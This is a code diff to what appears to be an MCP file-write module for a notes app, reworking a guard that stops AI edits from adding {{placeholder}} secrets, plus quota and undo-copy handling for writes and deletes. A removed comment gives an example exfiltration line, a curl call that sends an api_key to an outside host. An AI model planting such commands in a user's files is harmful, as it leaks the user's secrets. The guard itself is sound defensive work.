@@ -3,11 +3,14 @@
 // no watcher echo in this process) with the folder's commit-time guard (where the path really leads,
 // the precondition, the old bytes for the journal), then a journal entry and an index update.
 import fsp from 'node:fs/promises';
+import path from 'node:path';
 import { BackendFailure } from '../backend/errors';
 import { decode, encode } from '../backend/textcodec';
 import type { TextEncoding } from '../shared/api';
+import { dirname } from '../shared/paths';
 import type { Folder, Stamp, Target, TextFile } from './folders';
 import type { Journal, JournalOp } from './journal';
+import { checkPlaceholderPolicy, secretScope, type SecretScope } from './placeholders';
 import { ToolError } from './protocol';
 
 /** Content one write_file call may send. */
@@ -36,26 +39,6 @@ export class WriteQuota {
   }
 }
 
-const PLACEHOLDER = /\{\{\s*([A-Za-z_][\w.-]*)\s*(?::[^{}\n]*)?\}\}/g;
-const placeholderCounts = (text: string) => {
-  const m = new Map<string, number>();
-  if (text.indexOf('{{') === -1) return m;
-  for (const x of text.matchAll(PLACEHOLDER)) m.set(x[1], (m.get(x[1]) ?? 0) + 1);
-  return m;
-};
-
-/**
- * {{variables}} placeholders resolve to the user's values (secrets included) when they copy or run a
- * block in One. An AI edit must not add one (a new name or another use of an existing one): a planted
- * `curl https://x/?k={{api_key}}` would leak the key the next time the user runs it.
- */
-export function checkPlaceholders(before: string, after: string) {
-  const a = placeholderCounts(before);
-  for (const [name, n] of placeholderCounts(after)) {
-    if (n > (a.get(name) ?? 0)) throw new ToolError('ESECRET', `The new text adds the placeholder {{${name}}}. AI apps cannot add {{…}} placeholders: in One they fill in your values and secrets when you copy or run a block. Leave them out, or ask the user to add them.`);
-  }
-}
-
 export interface WriteCtx {
   folder: Folder;
   journal: Journal;
@@ -63,6 +46,33 @@ export interface WriteCtx {
   tool: string;
   /** Moves a file to the Recycle Bin / trash; throws when there is none for this path. */
   trash(abs: string): Promise<void>;
+  /** The variables file name (setting variables.fileName). */
+  varsFile: string;
+}
+
+/** The {{placeholder}} secrets for a note at `notePath`: its nearest variables file between its folder and
+ *  the share root (as the app finds it: the name compared case-insensitively), or none = fail closed. Read
+ *  from the disk, not the listing: a variables file created a moment ago counts at once. One that cannot be
+ *  read through the resolver (hidden, excluded, a link) counts as unreadable: fail closed too. */
+export async function scopeAt(c: WriteCtx, notePath: string, noteText: string): Promise<SecretScope> {
+  const name = (c.varsFile.trim() || 'variables.md').toLowerCase();
+  for (let dir = dirname(notePath); ; dir = dirname(dir)) {
+    const entries = await fsp.readdir(dir ? path.join(c.folder.root, ...dir.split('/')) : c.folder.root, { withFileTypes: true }).catch(() => []);
+    const hit = entries.find((e) => e.name.toLowerCase() === name && !e.isDirectory());
+    if (hit) {
+      const vars = await c.folder.readText(dir ? `${dir}/${hit.name}` : hit.name).catch(() => null);
+      return secretScope(vars ? vars.content : null, noteText);
+    }
+    if (!dir) return secretScope(null, noteText);
+  }
+}
+
+/** The placeholder rules (placeholders.ts) for an edit of one file in place. */
+export async function placeholderGuard(c: WriteCtx, key: string, before: string, after: string) {
+  // Variables files first: nothing about them is read or parsed when the answer is no anyway.
+  const s1 = await scopeAt(c, key, before);
+  const s2 = after === before ? s1 : await scopeAt(c, key, after);
+  await checkPlaceholderPolicy({ path: key, before, after, scopeBefore: s1, scopeAfter: s2, fileName: c.varsFile });
 }
 
 export const etagOf = (s: Stamp) => `${s.mtime}-${s.size}`;
@@ -132,13 +142,24 @@ async function stampOf(abs: string): Promise<Stamp | null> {
 /** Replaces the text of an existing file read as `read` (it must still be exactly that at commit time). */
 export async function overwrite(c: WriteCtx, t: Target, read: TextFile, text: string, op: JournalOp, group?: string): Promise<{ etag: string; journal?: string }> {
   if (read.binary) throw new ToolError('EINVAL', `Binary file: ${t.key} cannot be written as text`);
-  checkPlaceholders(read.content, text);
+  await placeholderGuard(c, t.key, read.content, text);
   encodable(text, read.encoding);
   if (Buffer.byteLength(text, 'utf8') > MAX_RESULT_BYTES) throw new ToolError('ETOOBIG', `The result would be too large (over ${MAX_RESULT_BYTES / 1048576} MB)`);
   const ws = await c.folder.workspace();
   let prev: Buffer | null = null;
   try {
-    await ws.writeFile(t.key, text, { expectedMtime: read.mtime }, c.folder.guard({ expect: { mtime: read.mtime, size: read.size }, capture: (b) => (prev = b) }));
+    await ws.writeFile(
+      t.key,
+      text,
+      { expectedMtime: read.mtime },
+      c.folder.guard({
+        expect: { mtime: read.mtime, size: read.size },
+        capture: async (b) => {
+          await c.journal.reserve(b?.length ?? 0); // EQUOTA here: nothing is written
+          prev = b;
+        },
+      }),
+    );
   } catch (err) {
     throw writeError(err, t.key);
   }
@@ -151,7 +172,7 @@ export async function overwrite(c: WriteCtx, t: Target, read: TextFile, text: st
 
 /** Creates a new text file (LF, UTF-8; parent folders too). Fails if anything is there by then. */
 export async function create(c: WriteCtx, t: Target, text: string): Promise<{ etag: string; journal?: string }> {
-  checkPlaceholders('', text);
+  await placeholderGuard(c, t.key, '', text);
   const ws = await c.folder.workspace();
   try {
     await ws.createFile(t.key, text, c.folder.guard({ expect: 'absent' }));
@@ -177,7 +198,11 @@ export async function makeDir(c: WriteCtx, t: Target): Promise<{ journal?: strin
   return { journal: c.journal.enabled ? g : undefined };
 }
 
-/** To the Recycle Bin only (never a permanent delete); the old bytes go to the journal too. */
+/**
+ * To the Recycle Bin only, and an undo copy is always kept, even while undo copies are off: on Windows a bin
+ * that is off or too small deletes for good, so the copy is the real safety net. No room for it (quota, or
+ * over 16 MB) = the delete is refused.
+ */
 export async function trashFile(c: WriteCtx, t: Target, expect: Stamp): Promise<{ journal?: string }> {
   const ws = await c.folder.workspace();
   let prev: Buffer | null = null;
@@ -189,14 +214,24 @@ export async function trashFile(c: WriteCtx, t: Target, expect: Stamp): Promise<
     }
   };
   try {
-    await ws.remove(t.key, toBin, c.folder.guard({ expect, capture: (b) => (prev = b) }));
+    await ws.remove(
+      t.key,
+      toBin,
+      c.folder.guard({
+        expect,
+        capture: async (b) => {
+          await c.journal.reserve(b?.length ?? 0, true);
+          prev = b;
+        },
+      }),
+    );
   } catch (err) {
     throw writeError(err, t.key);
   }
   const g = c.journal.newGroup();
-  await c.journal.add(g, { client: c.client, tool: c.tool, root: c.folder.root, folder: c.folder.alias, op: 'delete', path: t.key, after: null }, prev).catch((err) => console.error('[mcp] journal', err));
+  await c.journal.add(g, { client: c.client, tool: c.tool, root: c.folder.root, folder: c.folder.alias, op: 'delete', path: t.key, after: null }, prev, { force: true }).catch((err) => console.error('[mcp] journal', err));
   c.folder.changed([{ type: 'unlink', path: t.key }]);
-  return { journal: c.journal.enabled ? g : undefined };
+  return { journal: g };
 }
 
 /** Renames / moves a file or folder; refuses to overwrite. Both ends are checked again at commit time. */
